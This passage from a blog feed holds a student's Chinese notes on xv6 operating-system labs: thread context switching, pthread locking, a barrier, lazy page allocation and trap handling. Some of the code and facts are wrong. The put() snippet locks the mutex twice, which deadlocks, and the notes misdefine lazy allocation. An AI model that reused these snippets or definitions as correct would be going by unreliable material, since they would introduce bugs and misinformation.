class="number">80</span>(a0)</span><br><span class="line">        sd s9, <span class="number">88</span>(a0)</span><br><span class="line">        sd s10, <span class="number">96</span>(a0)</span><br><span class="line">        sd s11, <span class="number">104</span>(a0)</span><br><span class="line"></span><br><span class="line">        ld ra, <span class="number">0</span>(a1)</span><br><span class="line">        ld sp, <span class="number">8</span>(a1)</span><br><span class="line">        ld s0, <span class="number">16</span>(a1)</span><br><span class="line">        ld s1, <span class="number">24</span>(a1)</span><br><span class="line">        ld s2, <span class="number">32</span>(a1)</span><br><span class="line">        ld s3, <span class="number">40</span>(a1)</span><br><span class="line">        ld s4, <span class="number">48</span>(a1)</span><br><span class="line">        ld s5, <span class="number">56</span>(a1)</span><br><span class="line">        ld s6, <span class="number">64</span>(a1)</span><br><span class="line">        ld s7, <span class="number">72</span>(a1)</span><br><span class="line">        ld s8, <span class="number">80</span>(a1)</span><br><span class="line">        ld s9, <span class="number">88</span>(a1)</span><br><span class="line">        ld s10, <span class="number">96</span>(a1)</span><br><span class="line">        ld s11, <span class="number">104</span>(a1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* YOUR CODE HERE */</span></span><br><span class="line">ret    <span class="comment">/* return to ra */</span></span><br></pre></td></tr></table></figure><p>设置保存寄存器的结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">user_context</span>&#123;</span><br><span class="line">  uint64 ra;    <span class="comment">//存储返回地址</span></span><br><span class="line">  uint64 sp;</span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">thread</span> &#123;</span><br><span class="line">  <span class="type">char</span>       stack[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="type">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="keyword">struct</span>     <span class="title class_">user_context</span> user_context;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里是模拟线程的执行，通过设置<code>ra寄存器</code>为要执行的线程的函数地址，使之返回时达到线程执行的效果。通过设置<code>sp寄存器</code>为结构体stack地址（堆上内存），将堆模拟为栈，实现不同线程拥有各自栈的情况。</p><p>同时，相较于进程切换需要保存两次寄存器（原进程跳转到scheduler再跳转到新进程），这里的线程切换只需要保存一次寄存器，然后由scheduler循环调度（不存在选择线程情况）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_schedule</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ...</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">thread_switch</span>((uint64)&amp;t-&gt;user_context,(uint64)&amp;current_thread-&gt;user_context);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="type">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">thread</span> *t;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  t-&gt;user_context.ra = (uint64)(*func);</span><br><span class="line">  t-&gt;user_context.sp = (uint64)t-&gt;stack + STACK_SIZE; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Using-threads-moderate"><a href="#Using-threads-moderate" class="headerlink" title="Using threads (moderate)"></a>Using threads (moderate)</h3><p>实际上让我们熟悉锁。我们只需在临界区加锁即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock[NBUCKET];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ...</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;lock[i]);</span><br><span class="line">    <span class="built_in">insert</span>(key, value, &amp;table[i], table[i]);</span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;lock[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">pthread_t</span> *tha;</span><br><span class="line">  <span class="type">void</span> *value;</span><br><span class="line">  <span class="type">double</span> t1, t0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NBUCKET; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_init</span>(&amp;lock[i], <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Barrier-moderate"><a href="#Barrier-moderate" class="headerlink" title="Barrier(moderate)"></a>Barrier(moderate)</h3><p>用锁实现屏障。</p><ul><li>当线程未全部到达时，阻塞所有线程</li><li>当最后一个线程到达时，达成条件，越过屏障，增加round，置零nthread，同时唤醒所有线程</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">barrier</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Block until all threads have called barrier() and</span></span><br><span class="line">  <span class="comment">// then increment bstate.round.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="built_in">pthread_mutex_lock</span>(&amp;bstate.barrier_mutex);</span><br><span class="line">  bstate.nthread++;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//fprintf(stderr, &quot;%d&quot;, bstate.nthread);</span></span><br><span class="line">  <span class="keyword">if</span> (bstate.nthread != nthread ) &#123;</span><br><span class="line">    <span class="built_in">pthread_cond_wait</span>(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);   <span class="comment">//在此等待</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (bstate.nthread == nthread) &#123;</span><br><span class="line">    bstate.nthread = <span class="number">0</span>;</span><br><span class="line">    bstate.round++;</span><br><span class="line">     <span class="built_in">pthread_cond_broadcast</span>(&amp;bstate.barrier_cond);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">pthread_mutex_unlock</span>(&amp;bstate.barrier_mutex);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x6</title>
      <link href="/2024/07/06/OS/xv6_0x6/"/>
      <url>/2024/07/06/OS/xv6_0x6/</url>
      
        <content type="html"><![CDATA[<h1 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h1><h3 id="interrupt"><a href="#interrupt" class="headerlink" title="interrupt"></a>interrupt</h3><ul><li><p>先设置初始化中断，在每个cpu运行进程时启用该cpu的中断。当需要向设备写入或读取数据时，调用函数判断该是否有缓冲区写入数据，如果有，则发生数据；如果没有，则该进程休眠，进行上下文切换，执行其他进程。</p></li><li><p>cpu接受到中断，由用户模式切换为监督者模式，进入<code>usertrap()</code>函数，判断为哪类中断。跳转到对应中断处理函数。</p></li><li><p>对于以太网等能以极高频率产生中断的程序（极大的中断开销），通常采用<code>轮询（polling）</code>的方式来处理中断。</p></li></ul><h3 id="Implement-copy-on-write-hard）"><a href="#Implement-copy-on-write-hard）" class="headerlink" title="Implement copy-on write (hard）"></a>Implement copy-on write (hard）</h3><p>太菜了没能搞成实验，搞了很久还是不行，内核编程太痛苦了。有时间把这个补充以下。</p><p>//TODO</p><p>总结一下原因：</p><ol><li>将重复、可明确区分的操作划分为函数操作，方便调试和区分。</li><li>增加动手前的思考时间，减少中途的改动。</li><li>要有耐心。</li></ol>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x5</title>
      <link href="/2024/07/04/OS/xv6_0x5/"/>
      <url>/2024/07/04/OS/xv6_0x5/</url>
      
        <content type="html"><![CDATA[<h1 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h1><p>21年后的lab删除了该lab</p><h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><ul><li><strong>急分配</strong>：当进程请求内存时，操作系统立即为其分配内存。</li><li><p><strong>懒分配</strong>：当进程请求内存时，操作系统不会立即为其分配内存，而是等待内存被释放后再为其分配。</p></li><li><p><strong>COPY-ON-WRITE(COW)  —FORK    牛叉</strong>：当一个进程创建另一个进程的副本时，新进程会开始时共享父进程的内存页。只有在这些页被写入时，才会复制这些页。</p></li><li><p>Demand page：当进程请求一个不存在的页面时，操作系统会将其加载到内存中。</p></li><li><p>least-recently-used（LRU）：LRU是一种页面替换算法，它根据页面最近被访问的时间来决定哪个页面应该被替换。</p></li><li><p>PTE_A   的作用：可用于时钟算法</p></li><li><p>memory-mapped-file：mmap系统调用</p></li></ul><h3 id="Eliminate-allocation-from-sbrk-easy"><a href="#Eliminate-allocation-from-sbrk-easy" class="headerlink" title="Eliminate allocation from sbrk() (easy)"></a>Eliminate allocation from sbrk() (easy)</h3><p>老师已经在lecture上讲了,所以完成的比较轻松。</p><p>首先我们修改<code>sys_sbrk()</code>函数，只修改<code>sz</code>大小，将内存分配交给中断！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line">  myproc()-&gt;sz = myproc()-&gt;sz + n;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们修改中断函数，在中断时，为<code>r_stval</code>寄存器（存储要访问内存的地址）分配页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span> || r_scause() == <span class="number">15</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    uint64 va = r_stval();</span><br><span class="line">    <span class="type">char</span> *mem ;</span><br><span class="line">    va = PGROUNDDOWN(va); </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page fault: %p\n&quot;</span>,va);    </span><br><span class="line">    <span class="keyword">if</span>((mem = kalloc()) == <span class="number">0</span>)    <span class="comment">//懒分配，每次只分配一次页面即可</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;      <span class="comment">//防止执行下面代码</span></span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">   <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(mem);</span><br><span class="line">       p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于该内存可能未经使用，而我们已经修改了<code>sz</code>，当释放堆内存时，由于是逐页释放的，当访问到未使用的页（未分配内存），检测到有效位PTE_V未设置，触发panic，因此我们需要修改<code>uvmunmap</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="type">int</span> do_free)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lazytests-and-Usertests"><a href="#Lazytests-and-Usertests" class="headerlink" title="Lazytests and Usertests"></a>Lazytests and Usertests</h3><p>在<code>sys_sbrk</code>我们需要处理当n为负数的情况，参考<code>growproc()</code>，当空出一页时要及时释放该页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  addr = p-&gt;sz;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(n &gt;= <span class="number">0</span>)&#123;   </span><br><span class="line">    p-&gt;sz = p-&gt;sz + n;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>( addr + n &gt; <span class="number">0</span>)&#123;   </span><br><span class="line">    p-&gt;sz = uvmdealloc(p-&gt;pagetable, addr, p-&gt;sz + n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>trap.c</code>里，添加对<code>va</code>的限制（限制在堆区）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span> || r_scause() == <span class="number">15</span>) </span><br><span class="line"> &#123;</span><br><span class="line">   uint64 va = r_stval();</span><br><span class="line">   <span class="type">char</span> *mem ;</span><br><span class="line">   va = PGROUNDDOWN(va); </span><br><span class="line">   </span><br><span class="line">  <span class="comment">// printf(&quot;page fault: %p\n&quot;,va); </span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(va &gt; p-&gt;sz )   <span class="comment">//高于sbrk()则终止进程</span></span><br><span class="line">   &#123;</span><br><span class="line">     p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   <span class="keyword">if</span> (va &gt;= p-&gt;sz || va &lt;= PGROUNDDOWN(p-&gt;trapframe-&gt;sp)) &#123;</span><br><span class="line">     p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">if</span>((mem = kalloc()) == <span class="number">0</span>)    <span class="comment">//懒分配，每次只分配一次页面即可</span></span><br><span class="line">   &#123;</span><br><span class="line">       p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;      <span class="comment">//防止执行下面代码</span></span><br><span class="line">   <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">  <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     kfree(mem);</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改<code>vm.c</code>的<code>uvmunmap</code>和<code>uvmcopy</code>，防止在<code>folk()</code>中出现panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="type">int</span> do_free)</span></span><br><span class="line">&#123;</span><br><span class="line">   ... </span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">//panic(&quot;uvmunmap: walk&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">//panic(&quot;uvmunmap: not mapped&quot;);</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">//panic(&quot;uvmcopy: pte should exist&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">//panic(&quot;uvmcopy: page not present&quot;);</span></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>read</code>和<code>write</code>等系统调用中，可能会用到未实际分配内存的地址。</p><p>此时由于进入了内核，无法触发用户中断，因此我们要让该地址所在的页已分配才能正常执行这些系统调用。显然，一个个修改系统调用是不现实的。</p><p>我们知道系统调用实际是通过<code>argaddr</code>、<code>argint</code>间接获得参数，且地址传入都通过<code>argaddr</code>函数。</p><p>因此我们可以在<code>argaddr</code>检测该地址所在的页是否被分配，如果未分配，则先分配再进入系统调用执行阶段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">argaddr</span><span class="params">(<span class="type">int</span> n, uint64 *ip)</span></span><br><span class="line">&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(walkaddr(p-&gt;pagetable, *ip) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">//地址在堆空间</span></span><br><span class="line">     <span class="keyword">if</span>(PGROUNDUP(p-&gt;trapframe-&gt;sp)  &lt;= *ip &amp;&amp; *ip &lt; p-&gt;sz) &#123;</span><br><span class="line">      <span class="type">char</span>* pa = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">memset</span>(pa, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, PGROUNDDOWN(*ip), PGSIZE, (uint64)pa, PTE_R | PTE_W | PTE_X | PTE_U) != <span class="number">0</span>) &#123;</span><br><span class="line">        kfree(pa);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x4</title>
      <link href="/2024/07/02/OS/xv6_0x4/"/>
      <url>/2024/07/02/OS/xv6_0x4/</url>
      
        <content type="html"><![CDATA[<h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><h3 id="trap步骤（跳转到trampoline）："><a href="#trap步骤（跳转到trampoline）：" class="headerlink" title="trap步骤（跳转到trampoline）："></a>trap步骤（跳转到trampoline）：</h3><p><strong>交换 <code>a0</code> 和 <code>sscratch</code></strong>：</p><ul><li>使用 <code>csrrw a0, sscratch, a0</code> 指令交换 <code>a0</code> 和 <code>sscratch</code> 的值。这样，<code>a0</code> 现在指向 TRAPFRAME，这是用户空间的 trapframe 地址，而 <code>sscratch</code> 保存了原来的 <code>a0</code> 值（即用户态传递的参数）。</li></ul><p><strong>保存用户态寄存器</strong>：</p><ul><li>将所有用户态寄存器的值保存到 <code>a0</code> 指向的 trapframe 中，以便在处理完陷阱后可以恢复这些寄存器的值。</li></ul><p><strong>保存用户态的 <code>a0</code></strong>：</p><ul><li>将 <code>sscratch</code>（即原来的 <code>a0</code>）保存到 trapframe 中，以便在返回用户态时可以恢复 <code>a0</code> 的值。</li></ul><p><strong>恢复内核态上下文</strong>：</p><ul><li>从 trapframe 中恢复内核栈指针（<code>sp</code>）、当前 hart 的 id（<code>tp</code>）、<code>usertrap</code> 函数的地址（<code>t0</code>），以及内核页表（<code>satp</code>）。</li></ul><p><strong>跳转到 <code>usertrap</code></strong>：</p><ul><li>使用 <code>jr t0</code> 跳转到 <code>usertrap()</code> 函数，这个函数处理实际的陷阱（如系统调用、中断或异常），并不会返回。</li></ul><h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><p>首先，按照指导书的提示将读取<code>fp(s0)</code>寄存器的指令写入<code>riscv.h</code>,并添加<code>backtrace()</code>到<code>sys_sleep</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 